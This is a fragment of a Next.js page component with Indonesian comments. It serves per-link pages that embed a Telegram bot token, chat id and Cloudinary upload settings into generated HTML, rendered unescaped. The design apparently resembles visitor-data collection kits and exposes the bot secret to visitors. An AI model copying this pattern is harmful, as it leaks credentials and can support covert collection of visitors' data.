    const { linkId } = params;

    await dbConnect();
    
    let link = await LinkModel.findOne({ $or: [{ _id: linkId }, { slug: linkId }] }).lean();
    if (!link) {
        return notFound();
    }

    // --- MODIFIKASI: Cek Kadaluarsa Link (Fitur Wajib) ---
    const now = new Date();
    if (link.expiresAt && new Date(link.expiresAt) < now) {
        return (
            <main style={{ textAlign: 'center', padding: '100px', backgroundColor: '#f8d7da', color: '#721c24', fontFamily: 'sans-serif' }}>
                <h1 style={{fontSize: '2em'}}>⚠️ Tautan Telah Kadaluarsa</h1>
                <p style={{fontSize: '1.2em'}}>Untuk alasan keamanan, tautan ini sudah tidak aktif. Silakan hubungi administrator.</p>
            </main>
        );
    }
    // ----------------------------------------------------

    const settings = await SettingsModel.findOne({}).lean();
    
    const currentLinkId = link._id.toString();
    
    // --- MODIFIKASI: Ambil Judul Website Global (Menghilangkan kata 'Demo') ---
    const websiteName = link.websiteName 
        || settings?.globalWebsiteTitle 
        || "Website Pribadi"; 
        
    // Pastikan menggunakan field model yang benar: telegramBotToken dan telegramChatId
    const botToken = link.telegramBotToken; 
    const chatId = link.telegramChatId;
    
    const cloudName = settings?.cloudinaryCloudName || 'djaiuiu4x';
    const uploadPreset = settings?.cloudinaryUploadPreset || 'upload';
    
    // Ambil Title Hero Section dari Settings
    const title = link.demoTitle 
        || settings?.globalDemoTitle 
        || "Fahil Gimang"; 
    // -------------------------------------------------------------------------

    // Render HTML final yang sudah disatukan
    const finalHtml = createFinalHtml(currentLinkId, botToken, chatId, cloudName, uploadPreset, title, websiteName);
    
    return (
        <div dangerouslySetInnerHTML={{ __html: finalHtml }} />
    );
}

export const dynamic = 'force-dynamic';